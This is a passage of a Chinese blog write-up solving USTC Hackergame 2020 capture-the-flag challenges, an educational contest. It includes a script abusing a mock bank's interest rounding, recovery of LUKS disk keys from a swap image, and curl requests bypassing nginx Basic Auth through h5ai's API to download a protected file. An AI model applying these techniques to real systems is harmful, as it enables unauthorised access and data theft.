OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 